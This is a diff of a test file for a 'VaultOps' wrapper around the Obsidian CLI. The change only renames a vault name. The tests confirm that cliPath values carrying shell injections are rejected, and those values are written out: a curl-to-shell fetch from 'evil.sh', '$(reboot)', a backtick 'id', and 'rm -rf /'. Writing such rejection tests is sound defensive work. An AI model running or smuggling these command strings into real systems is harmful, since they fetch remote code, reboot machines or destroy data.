@@ -57,21 +57,21 @@ describe('VaultOps', () => {
 
     it('rejects a cliPath containing shell metacharacters at construction (bead lget)', () => {
       // The exact poisoned value from the finding — must never construct.
-      expect(() => new VaultOps({ vaultName: 'V', cliPath: 'obsidian; curl evil.sh | sh' }))
+      expect(() => new VaultOps({ vaultName: 'Morgan', cliPath: 'obsidian; curl evil.sh | sh' }))
         .toThrow(/Refusing to use Obsidian CLI path/);
       // A few more classic injection payloads.
-      expect(() => new VaultOps({ vaultName: 'V', cliPath: '$(reboot)' }))
+      expect(() => new VaultOps({ vaultName: 'Morgan', cliPath: '$(reboot)' }))
         .toThrow(/Refusing to use Obsidian CLI path/);
-      expect(() => new VaultOps({ vaultName: 'V', cliPath: '`id`' }))
+      expect(() => new VaultOps({ vaultName: 'Morgan', cliPath: '`id`' }))
         .toThrow(/Refusing to use Obsidian CLI path/);
-      expect(() => new VaultOps({ vaultName: 'V', cliPath: 'obsidian && rm -rf /' }))
+      expect(() => new VaultOps({ vaultName: 'Morgan', cliPath: 'obsidian && rm -rf /' }))
         .toThrow(/Refusing to use Obsidian CLI path/);
     });
 
     it('rejects a relative (non-absolute, path-bearing) cliPath', () => {
-      expect(() => new VaultOps({ vaultName: 'V', cliPath: './obsidian' }))
+      expect(() => new VaultOps({ vaultName: 'Morgan', cliPath: './obsidian' }))
         .toThrow(/absolute path or a bare command name/);
-      expect(() => new VaultOps({ vaultName: 'V', cliPath: 'bin/obsidian' }))
+      expect(() => new VaultOps({ vaultName: 'Morgan', cliPath: 'bin/obsidian' }))
         .toThrow(/absolute path or a bare command name/);
     });
   });
@@ -276,7 +276,7 @@ describe('VaultOps', () => {
     });
 
     it('passes through timeout config to execFileSync', () => {
-      const custom = new VaultOps({ vaultName: 'V', timeoutMs: 5000 });
+      const custom = new VaultOps({ vaultName: 'Morgan', timeoutMs: 5000 });
       mockExecFileSync.mockReturnValue('');
       void custom.read('test');
       expect(mockExecFileSync).toHaveBeenCalledWith(
